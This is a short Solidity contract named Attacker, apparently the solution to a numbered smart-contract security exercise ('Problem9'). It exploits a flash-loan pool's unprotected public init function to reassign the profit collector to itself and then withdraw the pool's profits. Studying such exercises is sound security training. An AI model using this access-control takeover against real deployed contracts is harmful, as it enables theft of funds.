// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FlashLoanPool} from "../src/Problem9.sol";

contract Attacker {

    FlashLoanPool loanPool; // The smart contract to exploit.

    // Initializes the smart contract to exploit.
    constructor(FlashLoanPool _flashloan) {
        loanPool = _flashloan;
    }

    // The function the loan pool uses to initalize the
    // profit collector is public. Call it, reset the
    // collector to the Attacker contract, and collect
    // profits.
    function attack() public {
        loanPool.init(address(this));
        loanPool.collectProfits();
    }

    // Needed to receive profits.
    fallback() external payable {}

}